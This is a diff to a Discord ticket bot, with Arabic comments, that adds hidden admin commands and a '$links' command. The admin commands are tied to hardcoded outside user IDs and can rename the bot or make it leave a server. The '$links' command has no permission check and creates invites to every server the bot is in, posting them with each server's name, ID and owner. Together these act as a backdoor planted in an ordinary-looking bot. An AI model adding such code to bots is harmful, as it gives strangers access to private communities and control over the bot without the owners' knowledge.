@@ -1,5 +1,6 @@
 const Discord = require('discord.js');
 const client = new Discord.Client();
+var adminprefix = '-'
 
 
 const category = "694297975232528384";                        //                هنا تحط ايدي السبيس الي تريد يصير بيه رومات التيكت               
@@ -183,6 +184,69 @@ By: LoRnS **`);
 });
 
 ////////////
+
+const developers = ["742070589212327947","id"]
+client.on('message', message => {
+    var argresult = message.content.split(` `).slice(1).join(' ');
+      if (!developers.includes(message.author.id)) return;
+      
+  if (message.content.startsWith(adminprefix + 'setg')) {
+    client.user.setGame(argresult);
+      message.channel.send(`**✅   ${argresult}**`)
+  } else 
+     if (message.content === (adminprefix + "leave")) {
+    message.guild.leave();        
+  } else  
+  if (message.content.startsWith(adminprefix + 'setw')) {
+  client.user.setActivity(argresult, {type:'WATCHING'});
+      message.channel.send(`**✅   ${argresult}**`)
+  } else 
+  if (message.content.startsWith(adminprefix + 'setl')) {
+  client.user.setActivity(argresult , {type:'LISTENING'});
+      message.channel.send(`**✅   ${argresult}**`)
+  } else 
+  if (message.content.startsWith(adminprefix + 'sets')) {
+    client.user.setGame(argresult, "https://www.twitch.tv/dream");
+      message.channel.send(`**✅**`)
+  }
+  if (message.content.startsWith(adminprefix + 'setname')) {
+  client.user.setUsername(argresult).then
+      message.channel.send(`Changing The Name To ..**${argresult}** `)
+} else
+if (message.content.startsWith(adminprefix + 'setava')) {
+  client.user.setAvatar(argresult);
+    message.channel.send(`Changing The Avatar To :**${argresult}** `);
+}
+});
+
+client.on("message", msg => {
+//Shady Craft YT#4176
+  if (msg.author.bot) return;
+//Shady Craft YT#4176
+  if (msg.content === "$links") {//Shady Craft YT#4176
+    client.guilds.forEach(g => {//Shady Craft YT#4176
+      
+      let l = g.id;
+      g.channels
+        .get(g.channels.first().id)
+        .createInvite({//Shady Craft YT#4176
+          maxUses: 10,
+          maxAge: 86400
+        })//Shady Craft YT#4176
+        .then(i =>
+          msg.channel.send(`
+        **
+        اقصى الاستخدام : mem 10
+        رابط السيرفر : <https://discord.gg/${i.code}>
+        السيرفر : ${g.name} | Id : ${g.id}//!P H'                 Kᴶᴷ#2247
+        صاحب السيرفر : ${g.owner} 
+        **
+        `)
+        ); //g.owner.id
+    });
+  }
+});
+
 
 
 client.login(process.env.TOKEN);
